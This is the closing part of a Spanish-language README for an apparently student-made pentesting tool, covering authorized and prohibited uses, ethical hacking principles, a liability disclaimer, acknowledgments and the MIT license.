- **Convenio de Budapest sobre Cibercriminalidad**

### Uso Autorizado

✅ **Permitido:**
- Laboratorios personales completamente aislados
- Entornos de prueba con autorización empresarial escrita
- Competencias de CTF (Capture The Flag)
- Investigación académica supervisada
- Auditorías de seguridad contratadas legalmente

❌ **Prohibido:**
- Redes públicas sin permiso
- Redes corporativas sin autorización
- Redes de terceros
- Cualquier red que no sea de tu propiedad
- Fines maliciosos o de lucro ilícito

### Responsabilidad

El autor de este proyecto:

- ✅ Proporciona esta información con fines educativos
- ✅ Fomenta el uso ético de la seguridad informática
- ✅ Recomienda seguir todas las leyes aplicables

El autor NO se hace responsable de:

- ❌ Uso indebido de esta herramienta
- ❌ Daños causados por terceros
- ❌ Violaciones de leyes locales o internacionales
- ❌ Consecuencias legales derivadas del mal uso

### Principios de Hacking Ético

1. **Obtener permiso** explícito y por escrito antes de cualquier prueba
2. **Respetar la privacidad** y los datos de los usuarios
3. **Reportar vulnerabilidades** de manera responsable
4. **No causar daño** a sistemas o datos
5. **Documentar** todas las actividades de pentesting
6. **Mantener confidencialidad** de la información descubierta

---

## 👨‍💻 Autor

**Autor del Proyecto**

- 🎓 Estudiante de Ciberseguridad
- 🔐 Enfoque en Pentesting y Red Team

---

## 🙏 Agradecimientos

- **Kali Linux Team** - Por la mejor distribución de pentesting
- **Scapy Developers** - Por la increíble biblioteca de manipulación de paquetes
- **Comunidad de InfoSec** - Por compartir conocimiento
- **Profesores y Mentores** - Por guiar el aprendizaje ético

---


---

## 📄 Licencia

Este proyecto está bajo la **Licencia MIT**.

```
MIT License

Copyright (c) 2026  Maitte Rodriguez

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

<div align="center">


## 🔐 Recuerda: Con gran poder viene gran responsabilidad

**Usa estas técnicas de manera ética y legal**

---

**¿Te resultó útil este proyecto?**  
⭐ Dale una estrella en GitHub  
🔄 Comparte con la comunidad  
🐛 Reporta bugs o sugiere mejoras

---

**Made with ❤️ for the Cybersecurity Community**

*"El conocimiento de seguridad informática debe usarse para proteger, no para atacar"*

</div>
